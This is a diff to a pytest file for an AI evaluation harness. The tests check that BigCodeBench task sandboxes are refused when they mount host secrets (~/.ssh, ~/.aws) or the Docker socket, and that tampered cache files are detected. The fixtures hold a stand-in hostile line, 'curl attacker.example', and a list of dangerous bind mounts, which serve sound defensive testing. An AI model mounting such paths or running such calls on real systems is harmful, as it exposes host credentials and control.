@@ -8,6 +8,7 @@ from inspect_ai.dataset import Sample
 from inspect_ai.scorer import Score, Target, mean, scorer
 from inspect_ai.solver import TaskState
 from inspect_ai.util import ComposeConfig, ComposeService, SandboxEnvironmentSpec
+from inspect_ai.util._sandbox.compose import ComposeVolumeMount
 
 from whitney.harbor_tasks import bigcodebench_hard_complete
 
@@ -141,15 +142,39 @@ def test_a_symlink_in_the_cache_is_refused(tmp_path, fake_harbor):
         ("devices", ["/dev/kvm"], "devices"),
         ("volumes", ["/Users/someone/.ssh:/root/.ssh"], "bind mount /Users/someone/.ssh"),
         ("volumes", ["./data:/data"], "bind mount ./data"),
+        ("volumes", ["~/.aws:/home/node/.aws:ro"], "bind mount ~/.aws"),
+        ("volumes", [ComposeVolumeMount(type="bind", source="/var/run/docker.sock", target="/var/run/docker.sock")], "bind mount /var/run/docker.sock"),
     ],
 )
 def test_a_task_whose_sandbox_reaches_the_host_is_refused(tmp_path, fake_harbor, setting, value, named):
+    import re
+
     setattr(fake_harbor.compose.services["default"], setting, value)
-    with pytest.raises(ValueError, match=f"asks for {named}"):
+    with pytest.raises(ValueError, match=f"asks for {re.escape(named)}, which would let"):
         bigcodebench_hard_complete(target="kilo", model=MODEL, dataset_path=str(tmp_path))
 
 
 def test_named_and_anonymous_volumes_are_allowed(tmp_path, fake_harbor):
-    fake_harbor.compose.services["default"].volumes = ["cache:/cache", "/scratch"]
+    named = ComposeVolumeMount(type="volume", source="cache", target="/cache")
+    fake_harbor.compose.services["default"].volumes = ["cache:/cache", "/scratch", named]
     [sample] = list(bigcodebench_hard_complete(target="kilo", model=MODEL, dataset_path=str(tmp_path)).dataset)
-    assert sample.sandbox.config.services["default"].volumes == ["cache:/cache", "/scratch"]
+    assert sample.sandbox.config.services["default"].volumes == ["cache:/cache", "/scratch", named]
+
+
+def test_files_added_or_removed_since_the_sync_are_refused(tmp_path, fake_harbor):
+    (tmp_path / "task.toml").write_text("[task]\n")
+    _manifest(tmp_path, **{"task.toml": "[task]\n", "tests/test.sh": "exit 0\n"})
+    with pytest.raises(ValueError, match="changed since it was synced: tests/test.sh$"):  # removed
+        bigcodebench_hard_complete(target="kilo", model=MODEL, dataset_path=str(tmp_path))
+
+    _manifest(tmp_path, **{"task.toml": "[task]\n"})
+    for n in range(7):
+        (tmp_path / f"extra{n}.sh").write_text("curl attacker.example\n")
+    with pytest.raises(ValueError, match="changed since it was synced: extra0.sh, .*extra4.sh and 2 more$"):  # added
+        bigcodebench_hard_complete(target="kilo", model=MODEL, dataset_path=str(tmp_path))
+
+
+def test_a_manifest_from_before_digests_is_used_but_recorded_as_unverified(tmp_path, fake_harbor):
+    (tmp_path / "inspect-harbor-manifest.json").write_text('{"package": "bigcode/bigcodebench-hard-complete"}')
+    task = bigcodebench_hard_complete(target="kilo", model=MODEL, dataset_path=str(tmp_path))
+    assert task.metadata["cache_integrity"] == "unverified: the manifest has no file digests; re-sync the cache to add them"
